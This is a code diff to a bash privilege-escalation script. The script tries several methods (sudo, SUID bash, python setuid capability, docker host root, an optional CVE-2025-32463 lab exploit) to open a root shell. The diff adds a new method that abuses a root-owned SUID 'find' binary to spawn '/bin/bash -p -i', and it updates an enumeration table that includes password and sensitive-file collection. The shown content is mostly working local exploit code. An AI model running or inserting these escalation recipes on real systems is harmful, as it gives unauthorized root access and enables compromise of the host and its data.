@@ -165,7 +165,7 @@ if [[ $MODE == resume ]]; then
   IFS=$'\t' read -r saved_host recipe _ < "$success_file"
   [[ $saved_host == "$host_name" ]] || { printf 'Saved run belongs to another host.\n' >&2; exit 2; }
   case $recipe in
-    already-root|sudo-shell|suid-bash|python-cap-setuid|docker-host-root|cve-2025-32463-lab) ;;
+    already-root|sudo-shell|suid-bash|suid-find|python-cap-setuid|docker-host-root|cve-2025-32463-lab) ;;
     *) printf 'Unknown saved recipe.\n' >&2; exit 2 ;;
   esac
   if [[ $recipe == cve-2025-32463-lab ]] && (( ! LAB_CVE_ENABLED )); then
@@ -264,13 +264,21 @@ asset_from_release() {
 }
 
 verify_recipe() {
-  local recipe=$1 py caps image probe version cve_dir
+  local recipe=$1 py caps image probe version cve_dir finder
   case $recipe in
-    already-root) [[ $(id -u) == 0 ]] ;;
-    sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$(id -u)" = 0' >/dev/null 2>&1 ;;
+    already-root) [[ $EUID == 0 ]] ;;
+    sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$EUID" = 0' >/dev/null 2>&1 ;;
     suid-bash)
-      [[ -u /bin/bash && $(stat -c %u /bin/bash 2>/dev/null) == 0 ]] &&
-        /bin/bash -p -c 'test "$(id -u)" = 0' >/dev/null 2>&1
+      [[ -u /bin/bash && $(stat -Lc %u /bin/bash 2>/dev/null) == 0 ]] &&
+        /bin/bash -p -c 'test "$EUID" = 0' >/dev/null 2>&1
+      ;;
+    suid-find)
+      for finder in /usr/bin/find /bin/find; do
+        [[ -x $finder && -u $finder && $(stat -Lc %u "$finder" 2>/dev/null) == 0 ]] || continue
+        probe=$("$finder" /dev/null -exec /bin/bash -p -c 'printf "uid=%s\n" "$EUID"' \; 2>/dev/null) || continue
+        if [[ $probe == uid=0 ]]; then SUID_FIND_PATH=$finder; return 0; fi
+      done
+      return 1
       ;;
     python-cap-setuid)
       py=$(command -v python3 || true)
@@ -313,6 +321,7 @@ open_shell() {
     already-root) /bin/bash -i ;;
     sudo-shell) sudo -n /bin/bash -i ;;
     suid-bash) /bin/bash -p -i ;;
+    suid-find) "$SUID_FIND_PATH" /dev/null -exec /bin/bash -p -i \; ;;
     python-cap-setuid)
       py=$(command -v python3)
       "$py" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
@@ -400,7 +409,7 @@ if [[ -s $cve_tmp ]]; then
 fi
 
 selected=''
-candidates=(already-root sudo-shell suid-bash python-cap-setuid docker-host-root)
+candidates=(already-root sudo-shell suid-bash suid-find python-cap-setuid docker-host-root)
 if ((LAB_CVE_ENABLED)); then candidates+=(cve-2025-32463-lab); fi
 for candidate in "${candidates[@]}"; do
   if verify_recipe "$candidate"; then
@@ -437,7 +446,7 @@ Running Processes|enumerator output
 Network & WiFi Enumeration|local host output only
 Cronjobs & Scheduled Tasks|enumerator output; no task change
 Common Privilege Escalation Methods|enumerator output plus named recipes
-SUID / SGID binaries|enumerator output plus native bash proof
+SUID / SGID binaries|enumerator output plus native bash and find proofs
 Writable files & directories|enumerator output; no file change
 Passwords & sensitive files|enumerator output; values only in protected raw files
 Interesting Files|enumerator output
